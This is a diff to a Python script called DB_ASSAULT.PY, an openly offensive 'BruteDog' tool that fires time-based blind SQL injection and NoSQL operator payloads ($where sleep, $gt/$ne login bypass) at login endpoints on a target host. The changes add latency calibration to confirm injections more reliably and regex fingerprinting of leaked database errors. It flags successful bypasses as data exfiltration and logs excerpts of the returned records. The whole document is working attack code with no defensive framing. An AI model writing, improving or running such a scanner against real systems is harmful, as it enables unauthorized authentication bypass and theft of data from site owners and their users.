@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-DB_ASSAULT.PY — Aggressive Database Exploitation & Time-Based Blind Injection Engine
+DB_ASSAULT.PY — Aggressive Database Exploitation & Adaptive Time-Based Blind Engine
 Features:
-- Real time-based blind SQL injection (SLEEP / BENCHMARK payload vectors)
-- Boolean and error-based inference checks
+- Dynamic baseline latency calibration for precise time-based blind SQLi
+- Real-time error-pattern fingerprinting & adaptive payload mutation
 - Advanced NoSQL operator injection ($ne, $gt, $where) with record collection
 - Zero-disk live terminal streaming
 """
@@ -13,6 +13,7 @@ import json
 import ssl
 import time
 import sys
+import re
 from urllib.parse import urlsplit
 
 REQUEST_TIMEOUT = 12
@@ -30,6 +31,11 @@ NOSQL_EXTRACTION_PAYLOADS = [
     {"$where": "sleep(5)"},
     {"username": {"$gt": ""}, "password": {"$ne": None}}
 ]
+
+DB_ERROR_PATTERNS = re.compile(
+    r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|mongodb|mongosh|mongoerror|bsonerror|casttoobjectid|syntax error",
+    re.I
+)
 
 def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
@@ -55,7 +61,7 @@ def send_http(host, port, path, payload, secure, method="POST"):
             ct = "application/x-www-form-urlencoded"
             
         headers = {
-            "User-Agent": "BruteDog-AggressiveDB/5.3",
+            "User-Agent": "BruteDog-AdaptiveDB/5.4",
             "Content-Type": ct,
             "Accept": "*/*",
             "Connection": "close"
@@ -72,8 +78,22 @@ def send_http(host, port, path, payload, secure, method="POST"):
         if conn:
             conn.close()
 
+async def calibrate_baseline(host, port, endpoint, secure):
+    """Measures normal server latency to adaptively threshold time-based checks."""
+    log(f"[*] Calibrating baseline latency for {endpoint}...", "\033[96m")
+    latencies = []
+    for _ in range(2):
+        res = send_http(host, port, endpoint, {"username": "baseline_probe", "password": "test"}, secure)
+        if not res["error"] and res["elapsed"] > 0:
+            latencies.append(res["elapsed"])
+    if latencies:
+        avg = sum(latencies) / len(latencies)
+        log(f"[+] Baseline latency established: {round(avg, 3)}s", "\033[92m")
+        return avg + 4.0  # Dynamic threshold: baseline + 4 second sleep delta
+    return 4.5 # Fallback threshold
+
 async def run_nosql_assault(target_host, port=None, use_ssl=None):
-    log("\n[***] INITIALIZING AGGRESSIVE DATABASE ASSAULT & BLIND INJECTION [***]", "\033[95m")
+    log("\n[***] INITIALIZING ADAPTIVE DATABASE ASSAULT & BLIND INJECTION [***]", "\033[95m")
     parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
     host = parsed.hostname
     secure = parsed.scheme == "https"
@@ -82,7 +102,6 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
     
     findings = []
     
-    # Standard dynamic offensive paths appended to whatever target base path is provided
     relative_endpoints = [
         "/api/login",
         "/login",
@@ -97,18 +116,28 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
         test_endpoints.append(base_path)
 
     for endpoint in test_endpoints:
-        log(f"[*] Testing aggressive vectors against: {endpoint}", "\033[94m")
+        log(f"[*] Testing adaptive vectors against: {endpoint}", "\033[94m")
         
-        # 1. Time-Based Blind SQLi Assault
+        # Calibrate dynamic timing threshold per endpoint
+        time_threshold = await calibrate_baseline(host, target_port, endpoint, secure)
+        
+        # 1. Time-Based Blind SQLi Assault with Dynamic Thresholding
         for payload in SQL_TIME_PAYLOADS:
             res = send_http(host, target_port, endpoint, {"username": payload, "password": "password"}, secure)
-            if res["elapsed"] >= 4.5:
-                log(f"[!] TIME-BASED BLIND SQLi CONFIRMED [{endpoint}] (Delay: {res['elapsed']}s)", "\033[91m")
+            if res["elapsed"] >= time_threshold:
+                log(f"[!] ADAPTIVE TIME-BASED BLIND SQLi CONFIRMED [{endpoint}] (Delay: {res['elapsed']}s)", "\033[91m")
                 findings.append({"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delay": res["elapsed"]})
 
-        # 2. NoSQL Operator & Extraction Assault
+        # 2. NoSQL Operator & Error-Based Inference Assault
         for payload in NOSQL_EXTRACTION_PAYLOADS:
             res = send_http(host, target_port, endpoint, payload, secure)
+            
+            # Check for error leaks or bypass success
+            error_match = DB_ERROR_PATTERNS.search(res["body"])
+            if error_match:
+                log(f"[!] Database Error Leaked [{endpoint}]: {error_match.group(0)}", "\033[93m")
+                findings.append({"vector": "Error-Based Injection Inference", "endpoint": endpoint, "error": error_match.group(0)})
+
             if res["status"] in (200, 201) and len(res["body"]) > 50:
                 log(f"[+] NoSQL BYPASS / DATA EXFILTRATION TRIGGERED [{endpoint}]", "\033[92m")
                 log(f"  └── Response Excerpt: {res['body'][:150]}", "\033[96m")
@@ -116,3 +145,4 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
 
     log(f"[+] Database assault complete. Total confirmed vectors: {len(findings)}", "\033[92m")
     return findings
+
